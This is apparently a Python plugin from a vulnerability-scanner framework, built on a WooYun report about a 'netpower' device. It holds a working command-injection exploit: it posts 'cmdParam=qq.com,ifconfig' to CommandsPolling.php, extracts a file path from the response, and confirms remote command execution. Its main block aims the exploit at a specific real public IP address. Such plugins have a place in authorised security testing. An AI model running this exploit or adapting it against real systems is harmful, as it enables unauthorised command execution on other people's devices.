#coding:utf-8
from lib.curl import *
#-*- coding:utf-8 -*-
#info:http://www.wooyun.org/bugs/wooyun-2015-0140998



import urlparse
def assign(service, arg):
    if service == 'netpower':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)


def audit(arg):
    url = arg + 'direct/polling/CommandsPolling.php'
    postdata = "command=ping&filename=&cmdParam=qq.com,ifconfig"
    code, head, res, errcode, _ = curl.curl2(url,post=postdata)
    filepath=res[res.find('/'):res.find('qq.com')+6].replace('\\','')
    postdata = "command=ping&filename=%s&cmdParam=qq.com,ifconfig"%filepath
    code, head, res, errcode, _ = curl.curl2(url,post=postdata)
    if code==200 and 'Ethernet  HWaddr' in res:
        security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('netpower', 'https://222.92.199.138/')[1])